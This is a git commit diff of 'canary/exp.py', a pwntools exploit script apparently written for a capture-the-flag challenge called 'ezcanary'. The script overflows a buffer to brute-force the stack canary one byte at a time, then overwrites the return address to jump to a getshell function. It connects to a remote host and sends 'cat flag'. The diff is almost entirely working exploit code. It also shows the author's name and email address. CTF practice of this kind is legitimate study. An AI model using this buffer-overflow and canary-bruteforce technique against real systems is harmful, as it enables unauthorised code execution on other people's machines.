c9df8bdf89095a0b61ccbaa07059f62a95d5fcbe
alexdkfighter <13695242581@163.com>
2025-01-08 19:49:18 +0800

    no message

--- canary/exp.py
+++ canary/exp.py
@@ -1,8 +1,8 @@
-from pwn import *
+'''from pwn import *
 #context(arch = 'amd64', os = 'linux', log_level = 'debug')
 context(arch = 'amd64', os = 'linux')
-p = process('./ezcanary')
-#p = remote("ip",port)
+#p = process('./ezcanary')
+p = remote("10.252.112.192",4603)
 #elf = ELF('./ezcanary')
 #libc = ELF('./libc.so.6')
 
@@ -14,9 +14,9 @@ def aaa() :
   for i in range(256):
     payload1 = (0x60-8) * b'a' + can + p8(i)
     p.sendafter('你觉得呢？\n',payload1)
-    info = p.recvuntil('\n')
+    info = p.recvuntil(b'\n')
     if b"*** stack smashing detected ***" in info :
-        p.send('n\n')
+        p.send(b'n\n')
         continue
     else :
         can += p8(i)
@@ -28,9 +28,9 @@ def bbb():
   for i in range(7):
     aaa()
     if i != 6 :
-      p.send('a\n')
+      p.send(b'a\n')
     else :
-      p.sendline('cat flag')
+      p.sendline(b'cat flag')
  
  
 bbb()
@@ -40,4 +40,43 @@ getshell = 0x401251
 payload2 = b"a" * (0x60-8) + p64(canary) + p64(0) + p64(getshell)
 p.sendafter("bruteforce\n", payload2)
 
+p.interactive()
+'''
+#_*_ coding:utf-8 _*_
+from pwn import *
+elf = ELF("./ezcanary")
+context(arch=elf.arch, os=elf.os)
+p = process([elf.path])
+p = remote("10.252.112.192",4603)
+
+def aaa() :
+  global can
+  for i in range(256):
+    payload1 = (0x60-8) * b'a' + can + p8(i)
+    p.sendafter('你觉得呢？\n',payload1)
+    info = p.recvuntil('\n')
+    if b"*** stack smashing detected ***" in info : 
+        p.send('n\n')
+        continue
+    else :
+        can += p8(i)
+        break
+
+def bbb():
+  global can
+  can = b'\x00'
+  for i in range(7):
+    aaa()
+    if i != 6 :
+      p.send('a\n')
+    else :
+      p.sendline('cat flag')
+
+
+bbb()
+canary = u64(can)
+print(hex(canary))
+getshell = 0x401251
+payload2 = b"a" * (0x60-8) + p64(canary) + p64(0) + p64(getshell)
+p.sendafter("bruteforce\n", payload2)
 p.interactive()
